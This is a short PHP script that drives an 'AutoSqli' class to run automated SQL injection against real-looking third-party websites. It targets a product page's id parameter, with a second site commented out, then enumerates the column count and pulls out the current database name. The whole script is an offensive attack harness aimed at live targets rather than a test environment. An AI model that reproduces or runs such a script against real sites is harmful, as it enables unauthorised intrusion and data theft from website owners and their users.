<?php

require "AutoSqli.php";

$autosqli = new AutoSqli();

$autosqli->setUrl("http://www.easygosg.com/attraction-product.php?id=14");
// // $autosqli->setUrl("http://coda.cc/product/product.php?id=4");

echo "[!] Target Url : " . $autosqli->getUrl() . "\n";

echo "[!] Prepare to get Columns...\n";
$autosqli->findnumbercolumn();

echo "[+] Number Columns: " . $autosqli->getnumbercolumn() . "\n";

echo "[!] Prepare to get Current Database...\n";
$autosqli->findcurrentdatabase();

echo "[+] Current Database: " . $autosqli->getcurrentdatabase() . "\n";
